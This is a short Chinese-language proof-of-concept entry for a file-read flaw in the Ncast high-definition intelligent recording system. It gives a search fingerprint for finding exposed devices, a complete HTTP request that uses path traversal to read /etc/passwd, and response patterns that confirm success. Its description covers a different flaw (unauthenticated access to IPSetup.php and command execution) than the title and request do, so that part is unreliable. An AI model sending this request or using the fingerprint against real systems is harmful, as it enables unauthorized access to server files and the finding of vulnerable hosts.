﻿# Ncast盈可视 高清智能录播系统 文件读取漏洞

> 更新时间：2024-05-07

> 漏洞编号：

> 漏洞说明：Ncast盈可视-高清智能录播系统可通过访客身份未授权访问 /manage/IPSetup.php 后台功能模块，攻击者可以利用该漏洞查看后台配置信息造成信息泄露，使用网络诊断功能模块可实现未授权远程命令执行，导致服务器失陷被控。

> 漏洞特征：app="Ncast-产品" && title=="高清智能录播系统"&&web.icon=="76e408df455fde9ec28aa2eb18ae499a"

> 验证脚本：HTTP

```
GET /developLog/downloadLog.php?name=../../../../etc/passwd HTTP/1.1
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=xxxx
Connection: close
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?root)(?=.*?bin).*?$

> 上传文件定位：

> 验证文件来源：Ncast盈可视 高清智能录播系统 文件读取漏洞.poc

